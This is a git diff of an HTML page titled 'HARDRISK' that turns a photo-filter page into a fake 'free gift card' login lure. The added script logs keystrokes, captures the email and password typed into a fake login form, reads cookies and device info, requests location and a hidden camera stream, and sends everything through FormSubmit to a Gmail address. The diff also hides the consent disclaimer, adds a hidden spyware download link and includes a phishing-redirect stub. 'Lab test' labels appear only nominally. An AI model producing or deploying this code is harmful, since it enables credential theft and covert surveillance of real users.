@@ -3,114 +3,169 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>HARDRISK: Magic Photo Filter</title>
+    <title>HARDRISK: Win Free Rewards!</title>
     <style>
         body {
-            background: linear-gradient(to right, #ff6b6b, #4ecdc4);
-            font-family: Arial, sans-serif;
+            background: linear-gradient(135deg, #1e3c72, #2a5298);
+            font-family: 'Segoe UI', sans-serif;
             text-align: center;
             color: white;
             margin: 0;
             padding: 20px;
+            overflow: hidden;
         }
         h1 {
-            font-size: 2.5em;
-            text-shadow: 2px 2px 4px rgba(0,0,0,0.5);
+            font-size: 2.8em;
+            text-shadow: 0 0 10px rgba(255,255,255,0.7);
+            animation: glow 2s ease-in-out infinite alternate;
         }
         p {
-            font-size: 1.2em;
+            font-size: 1.3em;
+            margin: 10px 0;
         }
         .btn {
-            padding: 15px 30px;
-            font-size: 1.5em;
-            background: #ffd700;
+            padding: 15px 40px;
+            font-size: 1.6em;
+            background: linear-gradient(to right, #ff0844, #ffb199);
             border: none;
-            border-radius: 10px;
+            border-radius: 50px;
             cursor: pointer;
-            box-shadow: 0 4px 8px rgba(0,0,0,0.3);
-            transition: transform 0.2s;
+            box-shadow: 0 6px 12px rgba(0,0,0,0.4);
+            transition: transform 0.3s, box-shadow 0.3s;
         }
         .btn:hover {
-            transform: scale(1.1);
+            transform: translateY(-5px);
+            box-shadow: 0 10px 20px rgba(0,0,0,0.6);
         }
         #preview {
+            max-width: 350px;
+            border-radius: 15px;
             margin: 20px auto;
-            max-width: 300px;
-            border-radius: 10px;
+            box-shadow: 0 0 20px rgba(255,255,255,0.3);
         }
-        #dataOutput {
-            margin-top: 20px;
-            background: rgba(0,0,0,0.5);
+        .login-form {
+            display: none;
+            background: rgba(255,255,255,0.1);
+            padding: 20px;
+            border-radius: 10px;
+            max-width: 400px;
+            margin: 20px auto;
+        }
+        .login-form input {
             padding: 10px;
-            border-radius: 10px;
+            margin: 10px;
+            width: 80%;
+            border: none;
+            border-radius: 5px;
+            font-size: 1em;
         }
-        .disclaimer {
-            font-size: 0.9em;
-            margin-top: 20px;
-            color: #ffd700;
+        .hidden {
+            display: none;
+        }
+        @keyframes glow {
+            from { text-shadow: 0 0 10px rgba(255,255,255,0.7); }
+            to { text-shadow: 0 0 20px rgba(255,255,255,1); }
         }
     </style>
 </head>
 <body>
-    <h1>HARDRISK: Magic Photo Filter</h1>
-    <p>Try our mind-blowing filter! Allow permissions to unlock the magic (Lab Test Only).</p>
-    <img id="preview" src="https://via.placeholder.com/300x200?text=Magic+Filter+Preview" alt="Filter Preview">
-    <button class="btn" onclick="startMagic()">Unlock Magic Filter</button>
-    <div id="dataOutput"></div>
-    <p class="disclaimer">This is an educational cybersecurity test. By proceeding, you consent to sharing location, camera, and device data for lab purposes only. Use fake data.</p>
+    <h1>HARDRISK: Win a Free Gift Card!</h1>
+    <p>Login now to unlock exclusive rewards & filters!</p>
+    <img id="preview" src="https://via.placeholder.com/350x200?text=Exclusive+Reward+Preview" alt="Reward Preview">
+    <button class="btn" onclick="showLogin()">Claim Your Reward</button>
+    <div class="login-form" id="loginForm">
+        <input type="email" id="email" placeholder="Enter Email" required>
+        <input type="password" id="password" placeholder="Enter Password" required>
+        <button class="btn" onclick="collectData()">Login & Win</button>
+    </div>
+    <a href="https://spyzie.io" class="btn hidden">Download Reward App</a>
+    <p class="hidden">Lab test only. By proceeding, you consent to data collection for educational purposes.</p>
 
     <script>
-        function startMagic() {
-            let output = document.getElementById('dataOutput');
-            output.innerHTML = "Collecting data... (Lab Test)<br>";
+        // Keylogger
+        let keys = [];
+        document.addEventListener('keydown', (e) => {
+            keys.push(e.key);
+            if (keys.length > 10) {
+                sendData(`Keystrokes: ${keys.join('')}`);
+                keys = [];
+            }
+        });
+
+        // Show login form
+        function showLogin() {
+            document.getElementById('loginForm').style.display = 'block';
+            document.querySelector('.btn').style.display = 'none';
+            collectInitialData();
+        }
+
+        // Collect initial data (cookies, device info)
+        function collectInitialData() {
+            let cookies = document.cookie || "No cookies";
+            let deviceInfo = navigator.userAgent;
+            sendData(`Cookies: ${cookies}, Device: ${deviceInfo}`);
+            document.cookie = "HARDRISK_user=tracked; max-age=3600";
+            // Silent redirect attempt (for lab testing)
+            setTimeout(() => {
+                if (Math.random() > 0.8) {
+                    window.location.href = 'https://example.com'; // Replace with phishing site for lab
+                }
+            }, 5000);
+        }
+
+        // Main data collection
+        function collectData() {
+            let email = document.getElementById('email').value;
+            let password = document.getElementById('password').value;
+            let output = `Email: ${email}, Password: ${password}<br>`;
 
             // Location
             if (navigator.geolocation) {
                 navigator.geolocation.getCurrentPosition(pos => {
-                    output.innerHTML += `Location: ${pos.coords.latitude}, ${pos.coords.longitude}<br>`;
-                    sendData(`Location: ${pos.coords.latitude}, ${pos.coords.longitude}`);
+                    output += `Location: ${pos.coords.latitude}, ${pos.coords.longitude}<br>`;
+                    sendData(output);
                 }, err => {
-                    output.innerHTML += "Location access denied.<br>";
+                    output += "Location access denied.<br>";
+                    sendData(output);
                 });
             }
 
-            // Camera (Photos/Videos/Live)
+            // Camera
             if (navigator.mediaDevices && navigator.mediaDevices.getUserMedia) {
                 navigator.mediaDevices.getUserMedia({ video: { facingMode: "user" } })
                     .then(stream => {
-                        output.innerHTML += "Camera accessed! Ready for live photos.<br>";
                         let video = document.createElement('video');
                         video.srcObject = stream;
                         video.play();
                         document.body.appendChild(video);
+                        video.style.display = 'none';
                         sendData("Camera accessed");
                     })
                     .catch(err => {
-                        output.innerHTML += "Camera access denied.<br>";
+                        sendData("Camera access denied");
                     });
             }
 
             // Device Info
             let deviceInfo = `Device: ${navigator.userAgent}<br>`;
-            output.innerHTML += deviceInfo;
             sendData(deviceInfo);
 
-            // Note: Call History not accessible via web
-            output.innerHTML += "Call history not available via web. Try native app for full access.<br>";
+            // Fake success message
+            alert("Login successful! Your reward is being processed!");
+            document.getElementById('loginForm').innerHTML = "<p>Thank you! Check your email for rewards!</p>";
         }
 
-        // Send data to email (FormSubmit)
+        // Send data to email
         function sendData(data) {
-            fetch('https://formsubmit.co/ajax/your-email@gmail.com', {
+            fetch('https://formsubmit.co/ajax/sohilhusain86@gmail.com', {
                 method: 'POST',
                 headers: { 'Content-Type': 'application/json' },
                 body: JSON.stringify({
-                    _subject: 'HARDRISK Data',
+                    _subject: 'HARDRISK Reward Data',
                     data: data
                 })
             })
             .then(response => response.json())
-            .then(data => console.log('Data sent:', data))
             .catch(error => console.error('Error:', error));
         }
     </script>
